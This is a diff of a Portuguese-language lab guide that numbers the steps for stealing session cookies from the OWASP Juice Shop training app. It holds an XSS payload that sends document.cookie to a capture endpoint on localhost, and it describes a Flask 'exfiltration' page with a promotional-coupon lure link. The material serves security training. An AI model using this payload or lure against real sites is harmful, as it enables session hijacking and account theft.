@@ -31,6 +31,7 @@ Payload XSS para teste:
 ```
 <iframe srcdoc="<script> fetch('http://127.0.0.1/capture?token='+document.cookie)</script>"></iframe>
 ```
+4°  Verificar no shell o cookie capturado
 
 ## Web-Server Exfiltration Web Link Python
 
@@ -41,9 +42,9 @@ Web-srv
        |_templates
                   |_index.html
 ```
-Criar um diretório com o nome Web-srv
+1° Criar um diretório com o nome Web-srv
 
-Copiar o código python e salvar como web-srv.py dentro do diretório Web-srv
+2° Copiar o código python e salvar como web-srv.py dentro do diretório Web-srv
 
 ```
 #!/usr/bin/env python3
@@ -66,9 +67,9 @@ def home():
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
 ```
-Criar um diretório como o nome templates dentro do diretório Web-srv
+3° Criar um diretório como o nome templates dentro do diretório Web-srv
 
-Copiar o código html e salvar como index.html dentro do diretório templates
+4° Copiar o código html e salvar como index.html dentro do diretório templates
 
 ```
 <!DOCTYPE html>
@@ -123,4 +124,8 @@ Copiar o código html e salvar como index.html dentro do diretório templates
 </body>
 </html>
 ```
-Executar $python ./web-srv.py
+5° Executar $python ./web-srv.py
+
+6° Acessar o Juice-Shop http://localhost:3000 e logar com algum usuário
+
+7° Acessar o endereço http://127.0.0.1 e clicar no link de Cupom Promocional
